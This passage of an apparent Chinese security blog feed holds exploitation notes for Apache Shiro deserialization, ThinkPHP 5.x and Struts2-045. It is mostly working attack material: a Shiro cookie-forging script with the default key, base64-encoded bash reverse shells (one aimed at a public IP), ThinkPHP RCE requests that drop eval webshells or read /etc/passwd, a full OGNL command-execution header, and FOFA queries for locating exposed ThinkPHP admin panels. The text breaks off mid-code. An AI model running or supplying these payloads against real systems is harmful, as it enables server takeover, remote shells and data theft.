class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># shiro-exp.py</span><br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> uuid<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> subprocess<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">encode_rememberme</span>(<span class="hljs-params">command</span>):<br>    popen = subprocess.Popen([<span class="hljs-string">&#x27;java&#x27;</span>, <span class="hljs-string">&#x27;-jar&#x27;</span>, <span class="hljs-string">&#x27;ysoserial.jar&#x27;</span>, <span class="hljs-string">&#x27;JRMPClient&#x27;</span>, command], stdout=subprocess.PIPE)<br>    BS = AES.block_size<br>    pad = <span class="hljs-keyword">lambda</span> s: s + ((BS - <span class="hljs-built_in">len</span>(s) % BS) * <span class="hljs-built_in">chr</span>(BS - <span class="hljs-built_in">len</span>(s) % BS)).encode()<br>    key = base64.b64decode(<span class="hljs-string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>)<br>    iv = uuid.uuid4().<span class="hljs-built_in">bytes</span><br>    encryptor = AES.new(key, AES.MODE_CBC, iv)<br>    file_body = pad(popen.stdout.read())<br>    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))<br>    <span class="hljs-keyword">return</span> base64_ciphertext<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    payload = encode_rememberme(sys.argv[<span class="hljs-number">1</span>])<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;rememberMe=&#123;0&#125;&quot;</span>.<span class="hljs-built_in">format</span>(payload.decode()))<br></code></pre></td></tr></table></figure><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">docker</span> pull medicean/vulapps:s_shiro_1<br><span class="hljs-attribute">docker</span> run -d -p <span class="hljs-number">7777</span>:<span class="hljs-number">8080</span> medicean/vulapps:s_shiro_1<br></code></pre></td></tr></table></figure><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><ol><li><p>检查是否存在默认的key 和漏洞</p><p>这里我们使用 Shiro_exploit 脚本，获取默认 key  </p><p><a href="https://github.com/insightglacier/Shiro_exploit">https://github.com/insightglacier/Shiro_exploit</a></p><blockquote><p>git clone <a href="https://github.com/insightglacier/Shiro_exploit.git">https://github.com/insightglacier/Shiro_exploit.git</a>  cd Shiro_exploit  </p><p>pip2 install requests  </p><p>pip2 uninstall crypto pycryptodome  </p><p>pip2 install pycryptodome</p></blockquote><p>脚本通过网络收集到的22个key，利用ysoserial工具中的URLDNS这个Gadget，并结合dnslog平  台实现漏洞检测。漏洞利用则可以选择Gadget和参数，增强灵活性。  </p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">python2 shiro_exploit.py -u http:<span class="hljs-regexp">//</span><span class="hljs-number">47.104</span>.<span class="hljs-number">255.11</span>:<span class="hljs-number">18080</span>/<br></code></pre></td></tr></table></figure></li><li><p>攻击机监听</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">nc</span><br></code></pre></td></tr></table></figure></li><li><p>VPS 利用反序列化工具生成 payload</p></li></ol><p>   <a href="https://www.sqlsec.com/rce/">https://www.sqlsec.com/rce/</a></p>   <figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">bash -c </span><span class="hljs-template-variable">&#123;echo, YmFzaCAtaSAvZGV2L3RjcC8xOTIuMTY4Ljc5LjEzMiAwPiYx&#125;</span><span class="language-xml">|</span><span class="hljs-template-variable">&#123;base64, -d&#125;</span><span class="language-xml">|</span><span class="hljs-template-variable">&#123;bash, -i&#125;</span><br></code></pre></td></tr></table></figure><ol start="4"><li><p>然后执行ysoserial</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">java </span>-cp ysoserial.<span class="hljs-keyword">jar </span>ysoserial.exploit.<span class="hljs-keyword">JRMPListener </span><span class="hljs-number">10998</span> CommonsCollections4 <span class="hljs-string">&quot;bash -c &#123;echo, YmFzaCAtaSAvZGV2L3RjcC8xOTIuMTY4Ljc5LjEzOC8yMjM0NSAwPiYx&#125;|&#123;base64, -d&#125;|&#123;bash, -i&#125;&quot;</span><br></code></pre></td></tr></table></figure></li><li><p>生成cookie<br><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/FastJson%E6%BC%8F%E6%B4%9E/image-20240118154031893.png" alt="image-20240118154031893"></p></li><li><p>发包</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/FastJson%E6%BC%8F%E6%B4%9E/image-20240118154255996.png" alt="image-20240118154255996"></p></li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>JavaScript</title>
    <link href="/2024/01/17/%E5%89%8D%E7%AB%AF/JavaScript/JavaScript/"/>
    <url>/2024/01/17/%E5%89%8D%E7%AB%AF/JavaScript/JavaScript/</url>
    
    <content type="html"><![CDATA[<h1 id=""><a href="#" class="headerlink" title=""></a></h1>]]></content>
    
    
    
    <tags>
      
      <tag>前端</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>JavaScript原型链污染</title>
    <link href="/2024/01/17/web/JavaScript%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/"/>
    <url>/2024/01/17/web/JavaScript%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/</url>
    
    <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>当我再做<code>wife_wife</code>的时候发现，这没有思路。所以学习一点新东西，并记录一下</p><h1 id="javascript"><a href="#javascript" class="headerlink" title="javascript"></a>javascript</h1><blockquote><p>JavaScript（简称“JS”） 是一种具有函数优先的轻量级，解释型或即时编译型的编程语言。虽然它是作为开发Web页面的脚本语言而出名，但是它也被用到了很多非浏览器环境中，JavaScript 基于原型编程、多范式的动态脚本语言，并且支持面向对象、命令式、声明式、函数式编程范式</p></blockquote><h1 id="NodeJS"><a href="#NodeJS" class="headerlink" title="NodeJS"></a>NodeJS</h1><blockquote><p>Node.js发布于2009年5月，由Ryan Dahl开发，是一个基于Chrome V8引擎的JavaScript运行环境，使用了一个事件驱动、非阻塞式I&#x2F;O模型， 让JavaScript 运行在服务端的开发平台，它让JavaScript成为与PHP、Python、Perl、Ruby等服务端语言平起平坐的脚本语言。</p></blockquote>]]></content>
    
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>thinkphp</title>
    <link href="/2024/01/16/%E6%B8%97%E9%80%8F/thinkphp/"/>
    <url>/2024/01/16/%E6%B8%97%E9%80%8F/thinkphp/</url>
    
    <content type="html"><![CDATA[<h1 id="Thinkphp"><a href="#Thinkphp" class="headerlink" title="Thinkphp"></a>Thinkphp</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><blockquote><p>  Thinkphp 是一种开源框架。是一个由国人开发的支持 windows&#x2F;Unix&#x2F;Linux 等服务器环境的轻量级PHP开发框架。  </p><p>  很多cms就是基于 thinkphp 二次开发的，所以 thinkphp 出问题的话，会影响很多基于 thinkphp开发的网站。  </p></blockquote><h2 id="判断网站是否使用thinkphp"><a href="#判断网站是否使用thinkphp" class="headerlink" title="判断网站是否使用thinkphp"></a>判断网站是否使用thinkphp</h2><ol><li><p>看报错是否是笑脸</p></li><li><p>批量检查漏洞</p></li><li><p>使用fofa</p><figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sas">header=<span class="hljs-string">&quot;thinkphp&quot;</span> <span class="hljs-variable">&amp;&amp;</span> country!=<span class="hljs-string">&quot;CN&quot;</span><br>header=<span class="hljs-string">&quot;thinkphp&quot;</span> <span class="hljs-variable">&amp;&amp;</span> country!=<span class="hljs-string">&quot;CN&quot;</span> <span class="hljs-variable">&amp;&amp;</span> <span class="hljs-keyword">title</span>=<span class="hljs-string">&quot;后台管理&quot;</span><br>header=<span class="hljs-string">&quot;thinkphp&quot;</span> <span class="hljs-variable">&amp;&amp;</span> country!=<span class="hljs-string">&quot;CN&quot;</span> <span class="hljs-variable">&amp;&amp;</span> <span class="hljs-keyword">title</span>=<span class="hljs-string">&quot;后台管理&quot;</span> <span class="hljs-variable">&amp;&amp;</span> after=<span class="hljs-string">&quot;2021-01-01&quot;</span><br></code></pre></td></tr></table></figure></li></ol><h2 id="利用工具"><a href="#利用工具" class="headerlink" title="利用工具"></a>利用工具</h2><blockquote><p><a href="https://github.com/Lotus6/ThinkphpGUI">https://github.com/Lotus6/ThinkphpGUI</a><br><a href="https://github.com/bewhale/thinkphp_gui_tools">https://github.com/bewhale/thinkphp_gui_tools</a><br><a href="https://github.com/MrHatSec/ThinkPhp5.x_Scan">https://github.com/MrHatSec/ThinkPhp5.x_Scan</a>  </p></blockquote><h2 id="Thinkphp3-漏洞总结"><a href="#Thinkphp3-漏洞总结" class="headerlink" title="Thinkphp3 漏洞总结"></a>Thinkphp3 漏洞总结</h2><blockquote><p><a href="https://y4er.com/post/thinkphp3-vuln/">https://y4er.com/post/thinkphp3-vuln/</a></p></blockquote><h2 id="Thinkphp5-RCE-总结"><a href="#Thinkphp5-RCE-总结" class="headerlink" title="Thinkphp5 RCE 总结"></a>Thinkphp5 RCE 总结</h2><blockquote><p>  <a href="https://y4er.com/post/thinkphp5-rce/">https://y4er.com/post/thinkphp5-rce/</a>  </p></blockquote><h2 id="5-0-常用poc"><a href="#5-0-常用poc" class="headerlink" title="5.0.* 常用poc"></a>5.0.* 常用poc</h2><p><strong>执行命令</strong></p><figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sas">/<span class="hljs-keyword">index</span>.php?s=<span class="hljs-keyword">index</span>/\think\Container/invokefunction<span class="hljs-variable">&amp;function</span>=call_user_func_array<span class="hljs-variable">&amp;vars</span>[0]=phpinfo<span class="hljs-variable">&amp;vars</span>[1][]=1<br>/<span class="hljs-keyword">index</span>.php?s=<span class="hljs-keyword">index</span>/\think\Container/invokefunction<span class="hljs-variable">&amp;function</span>=call_user_func_array<span class="hljs-variable">&amp;vars</span>[0]=system<span class="hljs-variable">&amp;vars</span>[1][]=whoami<br>/<span class="hljs-keyword">index</span>.php?s=<span class="hljs-keyword">index</span>/\think\Request/<span class="hljs-keyword">input</span><span class="hljs-variable">&amp;filter</span>=system<span class="hljs-variable">&amp;data</span>=id<br>/<span class="hljs-keyword">index</span>.php?s=/<span class="hljs-keyword">index</span>/\think\request/cache<span class="hljs-variable">&amp;key</span>=1|phpinfo<br><br></code></pre></td></tr></table></figure><p>  <strong>写入Webshell</strong> </p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Struts2/image-20240116180519363.png" alt="image-20240116180519363"></p> <figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">/index.php?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=file_put_contents&amp;vars[1][]=shell.php&amp;vars[1][]=</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[ccc]);<span class="hljs-meta">?&gt;</span></span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml">/index.php?s=/Index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=echo -n  YWFhPD9waHAgQGV2YWwoJF9QT1NUW2NjY10pOz8+YmJi | base64 -d &gt; shell9.php</span><br><span class="language-xml"></span><br><span class="language-xml">注意：Base64编码后的字符串如果含有 + 号，在URL中需要进行URL编码，及 + 号变为 %2B</span><br></code></pre></td></tr></table></figure><p>其他payload</p><figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs sas">/<span class="hljs-keyword">index</span>.php?s=<span class="hljs-keyword">index</span>/\think\app/invokefunction<span class="hljs-variable">&amp;function</span>=call_user_func_array<span class="hljs-variable">&amp;vars</span>[0]=system<span class="hljs-variable">&amp;vars</span>[1][]=whoami<br><br>/<span class="hljs-keyword">index</span>.php?s=<span class="hljs-keyword">index</span>/\think\Request/<span class="hljs-keyword">input</span><span class="hljs-variable">&amp;filter</span>=phpinfo<span class="hljs-variable">&amp;data</span>=1<br><br>/<span class="hljs-keyword">index</span>.php?s=<span class="hljs-keyword">index</span>/\think\Request/<span class="hljs-keyword">input</span><span class="hljs-variable">&amp;filter</span>=system<span class="hljs-variable">&amp;data</span>=id<br><br>/<span class="hljs-keyword">index</span>.php?s=<span class="hljs-keyword">index</span>/\think\template\driver\<span class="hljs-keyword">file</span>/write<span class="hljs-variable">&amp;cacheFile</span>=shell.php<span class="hljs-variable">&amp;content</span>=%3C?php%20phpinfo();?%3E<br><br>/<span class="hljs-keyword">index</span>.php?s=<span class="hljs-keyword">index</span>/\think\<span class="hljs-keyword">view</span>\driver\Php/<span class="hljs-keyword">display</span><span class="hljs-variable">&amp;content</span>=%3C?php%20phpinfo();?%3E<br><br>/<span class="hljs-keyword">index</span>.php?s=<span class="hljs-keyword">index</span>/\think\app/invokefunction<span class="hljs-variable">&amp;function</span>=call_user_func_array<span class="hljs-variable">&amp;vars</span>[0]=phpinfo<span class="hljs-variable">&amp;vars</span>[1][]=1<br><br>/<span class="hljs-keyword">index</span>.php?s=<span class="hljs-keyword">index</span>/\think\app/invokefunction<span class="hljs-variable">&amp;function</span>=call_user_func_array<span class="hljs-variable">&amp;vars</span>[0]=system<span class="hljs-variable">&amp;vars</span>[1][]=id<br>/<span class="hljs-keyword">index</span>.php?s=<span class="hljs-keyword">index</span>/\think\Container/invokefunction<span class="hljs-variable">&amp;function</span>=call_user_func_array<span class="hljs-variable">&amp;vars</span>[0]=phpinfo<span class="hljs-variable">&amp;vars</span>[1][]=1<br>/<span class="hljs-keyword">index</span>.php?s=<span class="hljs-keyword">index</span>/\think\Container/invokefunction<span class="hljs-variable">&amp;function</span>=call_user_func_array<span class="hljs-variable">&amp;vars</span>[0]=system<span class="hljs-variable">&amp;vars</span>[1][]=id<br><br>/<span class="hljs-keyword">index</span>.php?s=/<span class="hljs-keyword">Index</span>/\think\app/invokefunction<span class="hljs-variable">&amp;function</span>=call_user_func_array<span class="hljs-variable">&amp;vars</span>[0]=phpinfo<span class="hljs-variable">&amp;vars</span>[1][]=-1<br></code></pre></td></tr></table></figure><h2 id="5-1-漏洞利用poc"><a href="#5-1-漏洞利用poc" class="headerlink" title="5.1.*漏洞利用poc"></a>5.1.*漏洞利用poc</h2><p><strong>执行命令</strong></p><figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs sas">/<span class="hljs-keyword">index</span>.php?s=<span class="hljs-keyword">index</span>/\think\Container/invokefunction<span class="hljs-variable">&amp;function</span>=call_user_func_array<span class="hljs-variable">&amp;vars</span>[0]=phpinfo<span class="hljs-variable">&amp;vars</span>[1][]=1<br><br>/<span class="hljs-keyword">index</span>.php?s=<span class="hljs-keyword">index</span>/\think\Container/invokefunction<span class="hljs-variable">&amp;function</span>=call_user_func_array<span class="hljs-variable">&amp;vars</span>[0]=system<span class="hljs-variable">&amp;vars</span>[1][]=whoami<br><br>/<span class="hljs-keyword">index</span>.php?s=<span class="hljs-keyword">index</span>/\think\Request/<span class="hljs-keyword">input</span><span class="hljs-variable">&amp;filter</span>=system<span class="hljs-variable">&amp;data</span>=id<br><br>/<span class="hljs-keyword">index</span>.php?s=/<span class="hljs-keyword">index</span>/\think\request/cache<span class="hljs-variable">&amp;key</span>=1|phpinfo<br></code></pre></td></tr></table></figure><p><strong>写入webshell</strong></p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">/index.php?s=index/\think\Container/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=echo &quot;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(\<span class="hljs-variable">$_POST</span>[ccc]);<span class="hljs-meta">?&gt;</span></span><span class="language-xml">&quot; &gt;shell.php</span><br><span class="language-xml"></span><br><span class="language-xml">(echo &quot;^</span>&lt;?php @eval(\$_POST[ccc]);?^&gt;&quot; &gt;shell1.php)<br></code></pre></td></tr></table></figure><p>其他payload</p><figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs sas">/<span class="hljs-keyword">index</span>.php?s=<span class="hljs-keyword">index</span>/\think\app/invokefunction<span class="hljs-variable">&amp;function</span>=call_user_func_array<span class="hljs-variable">&amp;vars</span>[0]=system<span class="hljs-variable">&amp;vars</span>[1][]=whoami<br><br>/<span class="hljs-keyword">index</span>.php?s=<span class="hljs-keyword">index</span>/\think\Request/<span class="hljs-keyword">input</span><span class="hljs-variable">&amp;filter</span>=phpinfo<span class="hljs-variable">&amp;data</span>=1<br><br>/<span class="hljs-keyword">index</span>.php?s=<span class="hljs-keyword">index</span>/\think\Request/<span class="hljs-keyword">input</span><span class="hljs-variable">&amp;filter</span>=system<span class="hljs-variable">&amp;data</span>=id<br><br>/<span class="hljs-keyword">index</span>.php?s=<span class="hljs-keyword">index</span>/\think\template\driver\<span class="hljs-keyword">file</span>/write<span class="hljs-variable">&amp;cacheFile</span>=shell.php<span class="hljs-variable">&amp;content</span>=%3C?php%20phpinfo();?%3E<br><br>/<span class="hljs-keyword">index</span>.php?s=<span class="hljs-keyword">index</span>/\think\<span class="hljs-keyword">view</span>\driver\Php/<span class="hljs-keyword">display</span><span class="hljs-variable">&amp;content</span>=%3C?php%20phpinfo();?%3E<br><br>/<span class="hljs-keyword">index</span>.php?s=<span class="hljs-keyword">index</span>/\think\app/invokefunction<span class="hljs-variable">&amp;function</span>=call_user_func_array<span class="hljs-variable">&amp;vars</span>[0]=phpinfo<span class="hljs-variable">&amp;vars</span>[1][]=1<br><br>/<span class="hljs-keyword">index</span>.php?s=<span class="hljs-keyword">index</span>/\think\app/invokefunction<span class="hljs-variable">&amp;function</span>=call_user_func_array<span class="hljs-variable">&amp;vars</span>[0]=system<span class="hljs-variable">&amp;vars</span>[1][]=id<br>/<span class="hljs-keyword">index</span>.php?s=<span class="hljs-keyword">index</span>/\think\Container/invokefunction<span class="hljs-variable">&amp;function</span>=call_user_func_array<span class="hljs-variable">&amp;vars</span>[0]=phpinfo<span class="hljs-variable">&amp;vars</span>[1][]=1<br>/<span class="hljs-keyword">index</span>.php?s=<span class="hljs-keyword">index</span>/\think\Container/invokefunction<span class="hljs-variable">&amp;function</span>=call_user_func_array<span class="hljs-variable">&amp;vars</span>[0]=system<span class="hljs-variable">&amp;vars</span>[1][]=id<br><br>/<span class="hljs-keyword">index</span>.php?s=/<span class="hljs-keyword">Index</span>/\think\app/invokefunction<span class="hljs-variable">&amp;function</span>=call_user_func_array<span class="hljs-variable">&amp;vars</span>[0]=phpinfo<span class="hljs-variable">&amp;vars</span>[1][]=-1<br></code></pre></td></tr></table></figure><h2 id="5-0-23"><a href="#5-0-23" class="headerlink" title="5.0.23"></a>5.0.23</h2><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">POST：/index.php?s=captcha</span><br><span class="language-xml"></span><br><span class="language-xml">_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=cat /etc/passwd</span><br><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml">POST：/index.php?s=captcha</span><br><span class="language-xml"></span><br><span class="language-xml">_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=echo &quot;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(\<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<span class="hljs-meta">?&gt;</span></span><span class="language-xml">&quot; &gt; 1.php</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Struts2</title>
    <link href="/2024/01/16/%E6%B8%97%E9%80%8F/Struts2/"/>
    <url>/2024/01/16/%E6%B8%97%E9%80%8F/Struts2/</url>
    
    <content type="html"><![CDATA[<h1 id="struts2漏洞"><a href="#struts2漏洞" class="headerlink" title="struts2漏洞"></a>struts2漏洞</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><blockquote><p>  Apache Struts是美国阿帕奇（Apache）软件基金会负责维护的一个开源项目，是一套用于创建企业级  Java Web 应用的开源MVC框架，主要提供两个版本框架产品： Struts1和Struts2；Struts2是一个基于  MVC设计模式的Web应用框架，它本质上相当于一个servlet，在MVC设计模式中，Struts2作为控制器  (Controller)来建立模型与视图的数据交互。Struts2是Struts的下一代产品，是在 struts1和WebWork的  技术基础上进行了合并的全新的Struts2框架。  </p></blockquote><h2 id="历史漏洞"><a href="#历史漏洞" class="headerlink" title="历史漏洞"></a>历史漏洞</h2><p><a href="https://zhuanlan.zhihu.com/p/183876381">史上最全Struts2 漏洞复现合集（上） - 知乎 (zhihu.com)</a></p><h2 id="框架识别"><a href="#框架识别" class="headerlink" title="框架识别"></a>框架识别</h2><ol><li>通过网页后缀来进行判断，如.do或者.action  </li><li>通过 &#x2F;struts&#x2F;webconsole.html 是否存在来进行判断，需要 devMode 为 true</li></ol><h2 id="Struts2漏洞检测工具"><a href="#Struts2漏洞检测工具" class="headerlink" title="Struts2漏洞检测工具"></a>Struts2漏洞检测工具</h2><blockquote><p><a href="https://github.com/HatBoy/Struts2-Scan">https://github.com/HatBoy/Struts2-Scan</a><br><a href="https://github.com/Guaang/s2-tool">https://github.com/Guaang/s2-tool</a><br><a href="https://github.com/shack2/Struts2VulsTools">https://github.com/shack2/Struts2VulsTools</a></p></blockquote><h1 id="Struts2-045"><a href="#Struts2-045" class="headerlink" title="Struts2-045"></a>Struts2-045</h1><h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>  安恒信息安全研究院WEBIN实验室高级安全研究员nike.zheng发现著名J2EE（Java 2 Platform Enterprise Edition）框架——Struts2存在远程代码执行的严重漏洞，定级为高风险。在使用基于Jakarta插件的文件上传功能时，有可能存在远程命令执行，导致系统被黑客入侵。恶意用户可在上传文件时通过修改HTTP请求头中的Content-Type值来触发该漏洞，进而执行系统命令。</p><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Struts</span> <span class="hljs-number">2</span>.<span class="hljs-number">3</span>.<span class="hljs-number">5</span> – Struts <span class="hljs-number">2</span>.<span class="hljs-number">3</span>.<span class="hljs-number">31</span><br><span class="hljs-attribute">Struts</span> <span class="hljs-number">2</span>.<span class="hljs-number">5</span> – Struts <span class="hljs-number">2</span>.<span class="hljs-number">5</span>.<span class="hljs-number">10</span><br></code></pre></td></tr></table></figure><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><ol><li><p>开启环境之后</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Struts2/image-20240116092956719.png" alt="image-20240116092956719"></p></li><li><p>正常上传文件，然后抓包</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Struts2/image-20240116093337081.png" alt="image-20240116093337081"></p><p>然后修改对应的content-type的值</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livescript">Content-Type:<span class="hljs-string">&quot;%&#123;(<span class="hljs-subst">#nike</span>=&#x27;multipart/form-data&#x27;).(<span class="hljs-subst">#dm</span>=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(<span class="hljs-subst">#_memberAccess</span>?(<span class="hljs-subst">#_memberAccess</span>=<span class="hljs-subst">#dm</span>):((<span class="hljs-subst">#container</span>=<span class="hljs-subst">#context</span>[&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;]).(<span class="hljs-subst">#ognlUtil</span>=<span class="hljs-subst">#container</span>.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(<span class="hljs-subst">#ognlUtil</span>.getExcludedPackageNames().clear()).(<span class="hljs-subst">#ognlUtil</span>.getExcludedClasses().clear()).(<span class="hljs-subst">#context</span>.setMemberAccess(<span class="hljs-subst">#dm</span>)))).(<span class="hljs-subst">#cmd</span>=&#x27;whoami&#x27;).(<span class="hljs-subst">#iswin</span>=(@java.lang.System@getProperty(&#x27;os.name&#x27;).toLowerCase().contains(&#x27;win&#x27;))).(<span class="hljs-subst">#cmds</span>=(<span class="hljs-subst">#iswin</span>?&#123;&#x27;cmd.exe&#x27;,&#x27;/c&#x27;,<span class="hljs-subst">#cmd</span>&#125;:&#123;&#x27;/bin/bash&#x27;,&#x27;-c&#x27;,<span class="hljs-subst">#cmd</span>&#125;)).(<span class="hljs-subst">#p</span>=new java.lang.ProcessBuilder(<span class="hljs-subst">#cmds</span>)).(<span class="hljs-subst">#p</span>.redirectErrorStream(true)).(<span class="hljs-subst">#process</span>=<span class="hljs-subst">#p</span>.start()).(<span class="hljs-subst">#ros</span>=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(<span class="hljs-subst">#process</span>.getInputStream(),<span class="hljs-subst">#ros</span>)).(<span class="hljs-subst">#ros</span>.flush())&#125;&quot;</span><br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Struts2/image-20240116093520419.png" alt="image-20240116093520419"></p><p>实现rce</p></li><li><p>反弹shell</p><p>但是注意，java反弹shell必须要base64加密，因为java不能识别<code>&gt;</code>，<code>&amp;</code>等字符</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Struts2/image-20240116094200959.png" alt="image-20240116094200959"></p><p>第一个和第二个的区别是用于是否终端默认的是bash</p><p>然后将下面的这个放入bp</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> YmFzaCAtaSA+JiAvZGV2L3RjcC84LjEzMC4xMjMuMjUvOTk5OSAwPiYx|<span class="hljs-built_in">base64</span> -d|bash -i<br></code></pre></td></tr></table></figure><p>这个需要对应的ip和端口</p><blockquote><p><a href="https://www.sqlsec.com/rce/">命令执行在线编码 | 国光 (sqlsec.com)</a></p></blockquote><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240219163950680.png" alt="image-20240219163950680"></p><p>并且struts2是运行在root权限的，所以我们直接就获取root</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Struts2/image-20240116094800262.png" alt="image-20240116094800262"></p></li></ol><h1 id="struts2-059"><a href="#struts2-059" class="headerlink" title="struts2-059"></a>struts2-059</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 